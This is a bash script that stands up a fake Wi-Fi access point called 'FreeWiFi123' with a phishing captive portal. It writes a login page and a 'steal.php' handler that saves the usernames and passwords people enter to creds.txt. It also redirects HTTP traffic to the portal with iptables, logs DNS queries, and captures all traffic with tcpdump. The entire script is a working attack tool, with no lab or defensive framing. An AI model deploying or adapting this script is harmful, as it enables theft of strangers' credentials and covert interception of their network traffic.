#!/bin/bash

echo "[*] Releasing any previously claimed AP interfaces..."
for iface in $(ls /sys/class/net); do
    sudo ip link set $iface down 2>/dev/null
    sudo iw dev $iface set type managed 2>/dev/null
    sudo ip link set $iface up 2>/dev/null
done

# Detect Wi-Fi interface supporting AP mode
echo "[*] Detecting a suitable Wi-Fi interface for AP mode..."
WIFI_INTERFACE=""
for iface in $(ls /sys/class/net); do
    if [[ "$(iw dev "$iface" info 2>/dev/null | grep type | awk '{print $2}')" == "managed" ]]; then
        if iw list 2>/dev/null | grep -A 10 'Supported interface modes' | grep -q AP; then
            WIFI_INTERFACE="$iface"
            echo "[+] Found Wi-Fi interface with AP mode support: $WIFI_INTERFACE"
            break
        fi
    fi
done

if [ -z "$WIFI_INTERFACE" ]; then
    echo "[!] No suitable Wi-Fi interface found that supports AP mode."
    exit 1
fi

INTERNET_INTERFACE="ens33"
FAKE_SSID="FreeWiFi123"
PORTAL_DIR="/var/www/html"
LOG_FILE="/var/www/html/creds.txt"
DNSMASQ_LOG="/var/log/dnsmasq.log"
PCAP_LOG="/root/fake_wifi_traffic.pcap"

echo "[*] Bringing up Wi-Fi interface..."
sudo ip link set $WIFI_INTERFACE up

echo "[*] Starting fake AP with SSID: $FAKE_SSID"
create_ap --no-virt -n $WIFI_INTERFACE $FAKE_SSID &

sleep 10

echo "[*] Setting up phishing portal..."
sudo apt install apache2 dnsmasq tcpdump -y
sudo rm -rf $PORTAL_DIR/*
echo '<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
  <h2>Welcome to Free WiFi</h2>
  <form action="steal.php" method="POST">
    Username: <input type="text" name="username" /><br>
    Password: <input type="password" name="password" /><br>
    <input type="submit" value="Login" />
  </form>
</body>
</html>' | sudo tee $PORTAL_DIR/index.html > /dev/null

echo '<?php
file_put_contents("creds.txt", date("c") . " | " . $_POST["username"] . " | " . $_POST["password"] . "\n", FILE_APPEND);
?>' | sudo tee $PORTAL_DIR/steal.php > /dev/null

echo "[*] Starting Apache web server..."
sudo systemctl restart apache2

echo "[*] Redirecting all HTTP traffic to captive portal..."
sudo iptables -t nat -F
sudo iptables -t nat -A PREROUTING -i $WIFI_INTERFACE -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

echo "[*] Starting DNS redirection and logging..."
echo "log-queries" | sudo tee /etc/dnsmasq.conf > /dev/null
echo "log-facility=$DNSMASQ_LOG" | sudo tee -a /etc/dnsmasq.conf > /dev/null
sudo systemctl restart dnsmasq

echo "[*] Starting packet capture on $WIFI_INTERFACE..."
sudo tcpdump -i $WIFI_INTERFACE -w $PCAP_LOG &

echo "[+] Fake Wi-Fi access point '$FAKE_SSID' is running."
echo "[+] Users will be forced to visit the login portal."
echo "[+] Entered credentials will be saved to $LOG_FILE"
echo "[+] DNS requests logged to $DNSMASQ_LOG"
echo "[+] All traffic saved to $PCAP_LOG"
